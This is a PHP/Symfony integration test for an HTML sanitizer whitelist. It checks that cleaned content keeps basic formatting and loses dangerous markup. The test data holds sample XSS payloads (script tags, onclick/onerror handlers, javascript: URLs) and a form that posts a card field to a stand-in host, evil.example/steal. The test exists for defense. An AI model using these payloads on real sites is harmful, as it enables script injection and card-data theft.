<?php

declare(strict_types=1);

namespace App\Tests\Integration\Core\Shared;

use App\Core\Shared\Html\ContentHtml;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;

/** Білий список app.content_html (html_sanitizer.yaml) для текстів, які сайт виводить |raw. */
final class ContentHtmlTest extends KernelTestCase
{
    public function testDangerousMarkupIsRemovedAndFormattingKept(): void
    {
        $html = $this->html()->clean(<<<'HTML'
            <h2 id="a" class="x">Заголовок</h2>
            <p style="color:red" onclick="alert(1)">Абзац <strong>жирний</strong> <em>курсив</em> <u>підкреслений</u></p>
            <script>alert('xss')</script>
            <style>body{display:none}</style>
            <iframe src="https://evil.example/"></iframe>
            <img src="https://cdn.example.com/a.jpg" alt="фото" onerror="alert(2)">
            <img src="javascript:alert(3)" alt="зле">
            <a href="javascript:alert(4)">зле</a>
            <a href="https://example.com/doc" target="_blank" rel="nofollow" data-x="1">документ</a>
            <a href="/catalog/dveri" title="категорія">внутрішнє</a>
            <a href="mailto:info@example.com">пошта</a>
            <ul><li>один</li><li>два</li></ul>
            <table><thead><tr><th scope="col">Назва</th></tr></thead><tbody><tr><td colspan="2">МДФ</td></tr></tbody></table>
            <div class="wrap"><span style="font-size:30px">у блоку</span></div>
            <h1>Великий</h1>
            <form action="https://evil.example/steal"><input name="card"></form>
            HTML);
        self::assertNotNull($html);
        self::assertStringContainsString('<h2 id="a">Заголовок</h2>', $html);
        self::assertStringContainsString('<p>Абзац <strong>жирний</strong> <em>курсив</em> <u>підкреслений</u></p>', $html);
        self::assertStringNotContainsString('<script', $html);
        self::assertStringNotContainsString('alert(', $html, 'script/style/iframe знято разом із вмістом, обробники подій — теж');
        self::assertStringNotContainsString('<style', $html);
        self::assertStringNotContainsString('display:none', $html);
        self::assertStringNotContainsString('<iframe', $html);
        self::assertStringNotContainsString('evil.example', $html);
        self::assertStringContainsString('src="https://cdn.example.com/a.jpg"', $html);
        self::assertStringContainsString('alt="фото"', $html);
        self::assertStringNotContainsString('javascript:', $html);
        self::assertStringContainsString('href="https://example.com/doc"', $html);
        self::assertStringContainsString('target="_blank"', $html);
        self::assertStringNotContainsString('data-x', $html);
        self::assertStringContainsString('href="/catalog/dveri"', $html, 'відносні посилання дозволені');
        self::assertStringContainsString('href="mailto:info&#64;example.com"', $html, 'mailto дозволено; @ санітайзер кодує як &#64;');
        self::assertStringContainsString('<ul><li>один</li><li>два</li></ul>', $html);
        self::assertStringContainsString('<th scope="col">Назва</th>', $html);
        self::assertStringContainsString('<td colspan="2">МДФ</td>', $html);
        self::assertStringContainsString('<div><span>у блоку</span></div>', $html, 'div/span без атрибутів лишаються, class/style знято');
        self::assertStringNotContainsString('<h1', $html);
        self::assertStringContainsString('Великий', $html, 'невідомий тег знято, текст лишився');
        self::assertStringNotContainsString('<form', $html);
        self::assertStringNotContainsString('<input', $html);
    }

    /** Блок «Джерела» StudioHtml у статтях студії переживає редагування в адмінці (StudioApiTest чекає .post-sources h2). */
    public function testStudioSourcesSectionIsKept(): void
    {
        $html = $this->html()->clean('<section class="post-sources"><h2>Джерела</h2><ul><li><a href="https://example.com/" rel="nofollow noopener" target="_blank">Джерело</a></li></ul></section>');
        self::assertNotNull($html);
        self::assertStringStartsWith('<section class="post-sources"><h2>Джерела</h2>', $html);
        self::assertStringContainsString('rel="nofollow noopener"', $html);
    }

    public function testEmptyAndWhitespaceBecomeNull(): void
    {
        $html = $this->html();
        self::assertNull($html->clean(null));
        self::assertNull($html->clean('   '));
        self::assertNull($html->clean('<script>alert(1)</script>'), 'лише небезпечне → порожньо → null');
        self::assertSame('Текст', $html->clean('Текст'));
    }

    private function html(): ContentHtml
    {
        self::bootKernel();

        return self::getContainer()->get(ContentHtml::class);
    }
}
